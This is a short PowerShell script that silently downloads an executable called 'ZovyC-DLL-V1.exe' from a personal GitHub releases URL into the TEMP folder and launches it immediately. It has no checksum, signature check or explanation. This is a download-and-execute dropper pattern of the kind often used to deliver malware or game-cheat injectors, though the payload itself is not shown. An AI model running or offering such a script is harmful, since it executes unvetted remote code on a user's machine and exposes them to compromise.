$ProgressPreference = 'SilentlyContinue'

$file = "$env:TEMP\ZovyC-DLL-V1.exe"

$url = "https://github.com/joker55za66-ops/ZovyC-DLL-V1/releases/download/v1/ZovyC-DLL-V1.exe"

Invoke-WebRequest $url -OutFile $file

Start-Process $file
